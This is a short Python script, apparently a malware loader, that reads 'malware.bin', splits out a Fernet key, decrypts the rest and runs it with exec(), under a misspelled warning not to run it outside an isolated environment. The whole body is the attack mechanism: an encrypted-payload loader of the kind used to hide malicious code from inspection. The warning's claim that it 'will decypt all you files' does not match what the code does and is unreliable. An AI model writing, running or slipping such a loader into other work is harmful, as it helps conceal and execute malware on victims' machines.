#*************WARRNIG !!!!!!!!!!!!!!!!!!!!!!
#DO NOT RUN THIS CODE . it will decypt all you files
# You need an isolated environment to test

from cryptography.fernet import Fernet

def decrypt_and_execute(file_path):
    with open(file_path, "rb") as f:
        key, encrypted_payload = f.read().split(b"\n", 1)
        cipher = Fernet(key)
        payload = cipher.decrypt(encrypted_payload).decode()
        exec(payload)

# Load and execute the malware.bin file
decrypt_and_execute("malware.bin")